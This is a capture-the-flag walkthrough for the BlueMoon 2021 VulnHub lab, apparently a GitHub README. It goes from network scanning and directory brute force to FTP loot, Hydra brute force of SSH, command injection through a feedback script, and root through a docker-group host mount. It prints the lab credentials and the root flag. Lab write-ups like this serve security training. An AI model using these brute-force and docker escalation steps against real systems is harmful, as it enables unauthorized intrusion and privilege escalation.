# Vulnerable-Machine-BlueMoon

# BlueMoon 2021 VulnHub Walkthrough

## 🧠 Objective

* Identify target machine
* Enumerate open services
* Gain initial access
* Escalate privileges to root

---

## 🖥️ Lab Setup

* Attacker: Kali Linux
* Attacker IP : 192.168.56.101
* Target: BlueMoon 2021 (VulnHub)
* Target IP : 192.168.56.102

---

## 🔍 Step 1 — Discover Attacker IP

I used ifconfig to know the attacker's IP.

```
ifconfig
```

## 🔍 Step 2 — Discover Target IP

And then, identify the target machine on the network.

```
sudo netdiscover 
```

📌 Look for a new IP that is not your Kali machine.

Example result:

192.168.56.102 → Target Machine

---

## 🚪 Step 3 — Port Scanning

Run a full scan to identify open ports and services.

```
nmap -sC -sV -Pn -vv 192.168.56.102
```

### Example Findings:

* Port 22 → SSH
* Port 21 → FTP
* Port 80 → HTTP (Web Server)

## 🌐 Step 4 — Web Enumeration

I used gobuster to perform brute-forcing command to discover hidden paths on a web server.

```
gobuster dir --url http://ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 25 -x .txt, .php, .bak, .zip, .html
```

These are the directories that has been succesfully identified.

* /service-status
* /hiddent_text

- Accessing the root URL at http://192.168.56.102/hidden_text that led to a maintenance notice which stating, "Maintenance!Sorry For Delay.We will recover soon. Thank You ...
- There is something off with the Thank You and after clicking it, I discovered a QR code.
- Decoding the QR code revealed a FTP credentials for user and password.

```
user : user ftp passsword : fttp@ssword 
```

## 🔑 Step 5 — FTP Access

### 🔐 Connecting to FTP

I attempted to connect to the FTP service on the target machine:

```
ftp 192.168.56.102
```
---

### 📄 Enumerating Files

Once inside the FTP server, I listed the available files:

```bash
ls
```

The following files were found:

```text
information.txt
p_lists.txt
```

These files looked interesting and potentially contained useful information such as credentials or hints.

---

### ⬇️ Downloading Files

I downloaded both files to my local machine:

```bash
get information.txt
get p_lists.txt
```

The transfer completed successfully.

---

### 🚪 Exiting FTP

```bash
exit
```

Read the contents of the files:

```bash
cat information.txt
cat p_lists.txt
```


## 🔓 SSH Brute Force (Hydra)

After obtaining a potential password list (`p_lists.txt`) from the FTP server, I used Hydra to perform a brute force attack on the SSH service.

```
hydra -l robin -P p_lists.txt 192.168.56.102 ssh
```

---

### 📌 Result

Hydra successfully discovered valid SSH credentials:

```text
[22][ssh] host: 192.168.56.102   login: robin   password: k4vr3ndh4nh4ck3r
```

This confirms that:
- Username: `robin`
- Password: `k4vr3ndh4nh4ck3r`

### 🔐 Gaining Initial Access

Using the discovered credentials, I logged into the target machine via SSH:

```
ssh robin@192.168.56.102
```

---

## 📝 Executing feedback.sh

During the enumeration phase, a script named `feedback.sh` was discovered. This script appears to collect user input and execute a shell.

---

### 🔍 Running the Script

To execute the script:

```
./feedback.sh
```

---

### 🧾 Interaction

The script prompts for user input:

Enter Your Name:
Enter You FeedBack About This Target Machine:

Example:

Enter Your Name: zuzu
Enter You FeedBack About This Target Machine: /bin/bash

The script executes a shell, giving access to the system.

```
whoami
```

```text
jerry
```

---

### 🧠 User Information

```bash
id
```

```text
uid=1002(jerry) gid=1002(jerry) groups=1002(jerry),114(docker)
```

### 🐳 Checking Available Docker Images

```bash
docker images
```

```text
REPOSITORY   TAG     IMAGE ID       CREATED        SIZE
alpine       latest  28f6e2705743   5 years ago    5.61MB
```

---

### 🚀 Exploiting Docker for Root Access

I used Docker to mount the host filesystem and spawn a root shell:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash
```

---

### ✅ Root Access Achieved

```bash
whoami
```

```text
root
```

---

### 🏁 Capturing Root Flag

Navigate to root directory:

```bash
cd /root
ls
```

```text
root.txt
```

Read the flag:

```bash
cat root.txt
```

```text
Congratulations
You Reached Root...!
Root-Flag
FLAG{r00t-H4ckTh3Pl4n3t0nc34g41n}
```
